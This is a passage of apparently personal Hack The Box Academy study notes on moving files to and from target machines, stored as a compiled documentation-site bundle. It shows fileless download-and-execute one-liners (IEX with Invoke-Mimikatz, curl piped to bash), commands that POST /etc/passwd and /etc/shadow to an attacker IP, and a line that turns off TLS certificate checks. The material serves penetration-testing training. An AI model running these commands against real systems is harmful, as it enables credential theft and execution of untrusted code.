"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[1130],{7009:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"Hacking/HTB Academy/File transfers","title":"File transfer","description":"Imagine the scenario where we need to download or upload files to a target machine. There are situations where the usual mechanism might be blocked, so it\'s important to know many file transfer methods.","source":"@site/docs/Hacking/HTB Academy/File transfers.md","sourceDirName":"Hacking/HTB Academy","slug":"/Hacking/HTB Academy/File transfers","permalink":"/docs/Hacking/HTB Academy/File transfers","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"File inclusion","permalink":"/docs/Hacking/HTB Academy/File inclusion"},"next":{"title":"Linux fundamentals","permalink":"/docs/Hacking/HTB Academy/Linux fundamentals"}}');var l=s(4848),r=s(8453);const i={},a="File transfer",o={},d=[{value:"Windows",id:"windows",level:2},{value:"Base64",id:"base64",level:3},{value:"Powershell Web Downloads",id:"powershell-web-downloads",level:3},{value:"Downloadfile(Async)",id:"downloadfileasync",level:4},{value:"PowerShell DownloadString - Fileless Method",id:"powershell-downloadstring---fileless-method",level:4},{value:"PowerShell Invoke-WebRequest",id:"powershell-invoke-webrequest",level:4},{value:"SMB Downloads",id:"smb-downloads",level:3},{value:"FTP Downloads",id:"ftp-downloads",level:3},{value:"PowerShell Web Uploads",id:"powershell-web-uploads",level:3},{value:"SMB Uploads",id:"smb-uploads",level:3},{value:"FTP Uploads",id:"ftp-uploads",level:3},{value:"Linux",id:"linux",level:2},{value:"Base64",id:"base64-1",level:3},{value:"curl/wget",id:"curlwget",level:3},{value:"Fileless operations",id:"fileless-operations",level:3},{value:"Download with Bash",id:"download-with-bash",level:3},{value:"SSH",id:"ssh",level:3},{value:"Web upload",id:"web-upload",level:3},{value:"Multiple web servers",id:"multiple-web-servers",level:3},{value:"Transfer files with code",id:"transfer-files-with-code",level:2},{value:"Other transfers",id:"other-transfers",level:2},{value:"Netcat (nc)",id:"netcat-nc",level:3},{value:"WinRM",id:"winrm",level:3},{value:"RDP",id:"rdp",level:3},{value:"Protect file transfers",id:"protect-file-transfers",level:2},{value:"Living off the land",id:"living-off-the-land",level:2},{value:"Detection",id:"detection",level:2}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.header,{children:(0,l.jsx)(n.h1,{id:"file-transfer",children:"File transfer"})}),"\n",(0,l.jsx)(n.p,{children:"Imagine the scenario where we need to download or upload files to a target machine. There are situations where the usual mechanism might be blocked, so it's important to know many file transfer methods."}),"\n",(0,l.jsx)(n.h2,{id:"windows",children:"Windows"}),"\n",(0,l.jsx)(n.h3,{id:"base64",children:"Base64"}),"\n",(0,l.jsx)(n.p,{children:"If the file is not very large, we can encoded in Base64 in one end, paste it in the console and decode it in the other side. It's important to check the file hash are the same on both ends to ensure the transfer was successful."}),"\n",(0,l.jsx)(n.p,{children:"For example, we are transfering an RSA key:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"adriangalera@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n\nadriangalera@htb[/htb]$ cat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\n"})}),"\n",(0,l.jsx)(n.p,{children:"In Windows Powershell:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:'PS C:\\htb> [IO.File]::WriteAllBytes("C:\\Users\\Public\\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))\n'})}),"\n",(0,l.jsx)(n.p,{children:"PS C:\\htb> Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5"}),"\n",(0,l.jsx)(n.p,{children:"Algorithm       Hash                                                                   Path"}),"\n",(0,l.jsx)(n.hr,{}),"\n",(0,l.jsx)(n.p,{children:"MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\\Users\\Public\\id_rsa"}),"\n",(0,l.jsx)(n.p,{children:"This method might not always be possible. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters."}),"\n",(0,l.jsx)(n.p,{children:"The same mechanism can be used to download or to upload files."}),"\n",(0,l.jsx)(n.h3,{id:"powershell-web-downloads",children:"Powershell Web Downloads"}),"\n",(0,l.jsx)(n.h4,{id:"downloadfileasync",children:"Downloadfile(Async)"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')\nPS C:\\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')\nPS C:\\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')\n"})}),"\n",(0,l.jsx)(n.h4,{id:"powershell-downloadstring---fileless-method",children:"PowerShell DownloadString - Fileless Method"}),"\n",(0,l.jsx)(n.p,{children:"As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX."}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n"})}),"\n",(0,l.jsx)(n.h4,{id:"powershell-invoke-webrequest",children:"PowerShell Invoke-WebRequest"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n"})}),"\n",(0,l.jsx)(n.p,{children:"You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name."}),"\n",(0,l.jsx)(n.p,{children:"There are two main sources of issues while downloading stuff from PowerShell:"}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsxs)(n.li,{children:["Internet Explorer is not yet configured. You can use ",(0,l.jsx)(n.code,{children:"-UseBasicParsing"})," to bypass this."]}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX\n"})}),"\n",(0,l.jsxs)(n.ol,{start:"2",children:["\n",(0,l.jsx)(n.li,{children:"Errors related with SSL/TLS when certificate is not trusted. The solution is to execute this"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n"})}),"\n",(0,l.jsx)(n.h3,{id:"smb-downloads",children:"SMB Downloads"}),"\n",(0,l.jsx)(n.p,{children:"You can use SMB server in the attacker machine:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"sudo impacket-smbserver share -smb2support /tmp/smbshare\n# with username/password\nsudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n"})}),"\n",(0,l.jsx)(n.p,{children:"And use smb to download it in the victim:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"copy \\\\192.168.220.133\\share\\nc.exe\n"})}),"\n",(0,l.jsx)(n.p,{children:"With usernmae/password:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"net use n: \\\\192.168.220.133\\share /user:test test\ncopy n:\\nc.exe\n"})}),"\n",(0,l.jsx)(n.h3,{id:"ftp-downloads",children:"FTP Downloads"}),"\n",(0,l.jsxs)(n.p,{children:["Run ",(0,l.jsx)(n.code,{children:"pyftpdlib"})," FTP server in the attacker"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"sudo python3 -m pyftpdlib --port 21\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')\n"})}),"\n",(0,l.jsx)(n.p,{children:"Or create a command file to download the file:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"C:\\htb> echo open 192.168.49.128 > ftpcommand.txt\nC:\\htb> echo USER anonymous >> ftpcommand.txt\nC:\\htb> echo binary >> ftpcommand.txt\nC:\\htb> echo GET file.txt >> ftpcommand.txt\nC:\\htb> echo bye >> ftpcommand.txt\n# Let's execute the command\nC:\\htb> ftp -v -n -s:ftpcommand.txt\n# Let's verify\nmore file.txt\n"})}),"\n",(0,l.jsx)(n.h3,{id:"powershell-web-uploads",children:"PowerShell Web Uploads"}),"\n",(0,l.jsxs)(n.p,{children:["Most of the webserver need to be configured to accept uploads. To make thing easier, it exists the python ",(0,l.jsx)(n.code,{children:"uploadserver"})," module, which is an extension of the ",(0,l.jsx)(n.code,{children:"http.server"})," module:"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"python3 -m uploadserver\n"})}),"\n",(0,l.jsxs)(n.p,{children:["Now, we can use a PS script to do the upload. First we download and execcute the setup script. Later, we execute the ",(0,l.jsx)(n.code,{children:"Invoke-FileUpload"}),"."]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\nPS C:\\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts\n"})}),"\n",(0,l.jsxs)(n.p,{children:["Another option is to have ",(0,l.jsx)(n.code,{children:"nc"})," listening and use ",(0,l.jsx)(n.code,{children:"Invoke-WebRequest"})," in the Windows machine."]}),"\n",(0,l.jsx)(n.p,{children:"Attacker:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"nc -lvnp 8000\n"})}),"\n",(0,l.jsx)(n.p,{children:"Victim:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))\nPS C:\\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64\n"})}),"\n",(0,l.jsx)(n.h3,{id:"smb-uploads",children:"SMB Uploads"}),"\n",(0,l.jsxs)(n.p,{children:["Most firewall might block the SMB port. An alternative SMB can be run over HTTP using ",(0,l.jsx)(n.code,{children:"WebDAV"}),". When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP."]}),"\n",(0,l.jsx)(n.p,{children:"In the attacker machine, we can run a WebDAV server:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n"})}),"\n",(0,l.jsx)(n.p,{children:"In the Windows machine, we can use the server as it was SMB:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"dir \\\\192.168.49.128\\DavWWWRoot\ncopy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\ncopy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n"})}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"DavWWWRoot"})," is a special keyword recognized by the Windows Shell. You can use an existing folder if you want to avoid this keyword."]}),"\n",(0,l.jsx)(n.h3,{id:"ftp-uploads",children:"FTP Uploads"}),"\n",(0,l.jsx)(n.p,{children:"Let's run ftp server in the attacker machine:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"sudo python3 -m pyftpdlib --port 21 --write\n"})}),"\n",(0,l.jsx)(n.p,{children:"And now execute the upload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"PS C:\\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n"})}),"\n",(0,l.jsx)(n.p,{children:"or create and execute a command:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-ps1",children:"C:\\htb> echo open 192.168.49.128 > ftpcommand.txt\nC:\\htb> echo USER anonymous >> ftpcommand.txt\nC:\\htb> echo binary >> ftpcommand.txt\nC:\\htb> echo PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\nC:\\htb> echo bye >> ftpcommand.txt\n# Now execute the command\nC:\\htb> ftp -v -n -s:ftpcommand.txt\n"})}),"\n",(0,l.jsx)(n.h2,{id:"linux",children:"Linux"}),"\n",(0,l.jsx)(n.h3,{id:"base64-1",children:"Base64"}),"\n",(0,l.jsx)(n.p,{children:"The same encoding/decoding mechanism can be used to transfer files in Linux."}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsx)(n.li,{children:"Verify the encode base64"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"md5sum id_rsa\ncat id_rsa |base64 -w 0;echo\n"})}),"\n",(0,l.jsxs)(n.ol,{start:"2",children:["\n",(0,l.jsx)(n.li,{children:"Copy the base64, decode and verify the hash"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"adriangalera@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa\nmd5sum id_rsa\n"})}),"\n",(0,l.jsx)(n.h3,{id:"curlwget",children:"curl/wget"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\ncurl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n"})}),"\n",(0,l.jsx)(n.h3,{id:"fileless-operations",children:"Fileless operations"}),"\n",(0,l.jsx)(n.p,{children:"Thanks to the Linux pipes, we can execute a file without the need to download it:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n"})}),"\n",(0,l.jsxs)(n.p,{children:["The same can be done with ",(0,l.jsx)(n.code,{children:"wget"}),":"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n"})}),"\n",(0,l.jsx)(n.h3,{id:"download-with-bash",children:"Download with Bash"}),"\n",(0,l.jsxs)(n.p,{children:["Sometimes ",(0,l.jsx)(n.code,{children:"curl"})," nor ",(0,l.jsx)(n.code,{children:"wget"})," are available, in this case the built-in ",(0,l.jsx)(n.code,{children:"/dev/tcp"})," bash device can be used."]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'# Connect to the server\nexec 3<>/dev/tcp/10.10.10.32/80\n# Perform the GET request\necho -e "GET /LinEnum.sh HTTP/1.1\\n\\n">&3\n# Print the response\ncat <&3\n'})}),"\n",(0,l.jsx)(n.h3,{id:"ssh",children:"SSH"}),"\n",(0,l.jsxs)(n.p,{children:["Make sure there's a SSH server running on the other side. Then use ",(0,l.jsx)(n.code,{children:"scp"}),":"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"scp plaintext@192.168.49.128:/root/myroot.txt . \n"})}),"\n",(0,l.jsx)(n.p,{children:"scp can be used as well to upload files:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web-upload",children:"Web upload"}),"\n",(0,l.jsxs)(n.p,{children:["We can use ",(0,l.jsx)(n.code,{children:"uploadserver"})," in the same way as mentioned before in the Windows section. We can configure ",(0,l.jsx)(n.code,{children:"uploadserver"})," to work under HTTPS."]}),"\n",(0,l.jsx)(n.p,{children:"Create a self-signed certificate and start the server using the certificate."}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\nsudo python3 -m uploadserver 443 --server-certificate ~/server.pem\n"})}),"\n",(0,l.jsxs)(n.p,{children:["Now in the victim machine, we just need to pass the ",(0,l.jsx)(n.code,{children:"--insecure"})," flag:"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n"})}),"\n",(0,l.jsx)(n.h3,{id:"multiple-web-servers",children:"Multiple web servers"}),"\n",(0,l.jsx)(n.p,{children:"There are many ways to start a web server in multiple programming languages:"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["Python3: ",(0,l.jsx)(n.code,{children:"python3 -m http.server"})]}),"\n",(0,l.jsxs)(n.li,{children:["Python2: ",(0,l.jsx)(n.code,{children:"python2.7 -m SimpleHTTPServer"})]}),"\n",(0,l.jsxs)(n.li,{children:["PHP: ",(0,l.jsx)(n.code,{children:"php -S 0.0.0.0:8000"})]}),"\n",(0,l.jsxs)(n.li,{children:["Ruby: ",(0,l.jsx)(n.code,{children:"ruby -run -ehttpd . -p8000"})]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"transfer-files-with-code",children:"Transfer files with code"}),"\n",(0,l.jsx)(n.p,{children:"So far, we have seen ways of moving files using existing tools. However, we can leverage the use of programming languges to transfer data as well."}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Python 2.7:"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'python2.7 -c \'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")\'\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Python3:"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'python3 -c \'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")\'\n'})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"PHP:"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'php -r \'$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);\'\n'})}),"\n",(0,l.jsx)(n.p,{children:"Using fopen:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'php -r \'const BUFFER = 1024; $fremote = \nfopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);\'\n'})}),"\n",(0,l.jsx)(n.p,{children:"Download the file and execute it directly"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num => $line) { echo $line; }' | bash\n"})}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:"Ruby:"}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'ruby -e \'require "net/http"; File.write("LinEnum.sh", 